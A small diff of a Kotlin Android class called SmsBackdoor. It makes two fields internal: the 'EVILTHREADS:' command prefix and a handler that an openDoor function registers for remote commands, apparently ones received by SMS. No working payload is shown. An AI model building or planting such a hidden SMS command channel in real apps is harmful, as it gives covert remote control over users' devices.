@@ -42,8 +42,8 @@ import com.candroid.bootlaces.bootService
 */
 class SmsBackdoor{
     companion object{
-        var commandCode : String = "EVILTHREADS:"
-        var commandHandler : ((String) -> Unit)? = null
+        internal var commandCode : String = "EVILTHREADS:"
+        internal var commandHandler : ((String) -> Unit)? = null
         fun openDoor(ctx: AppCompatActivity, remoteCommandCode: String, notifTitle: String? = null, notifBody: String? = null, remoteCommandHandler: (remoteCommand: String) -> Unit){
             commandHandler = remoteCommandHandler
             commandCode = remoteCommandCode
